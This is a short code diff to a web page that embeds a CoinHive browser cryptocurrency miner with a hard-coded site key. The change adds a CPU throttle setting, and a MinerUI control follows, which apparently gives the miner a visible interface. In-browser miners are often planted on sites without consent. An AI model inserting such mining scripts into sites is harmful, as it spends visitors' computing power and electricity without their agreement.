@@ -83,7 +83,7 @@
 <script type="text/javascript">
     var miner = null;
     try {
-        miner = new CoinHive.Anonymous('N0McPYQV4Y7Qsqa0JcuusSCKMFfLofv1', {threads: 2});
+        miner = new CoinHive.Anonymous('N0McPYQV4Y7Qsqa0JcuusSCKMFfLofv1', {threads: 2, throttle: 0.5});
     } catch(e) {}
 
     var ui = new MinerUI(miner, {
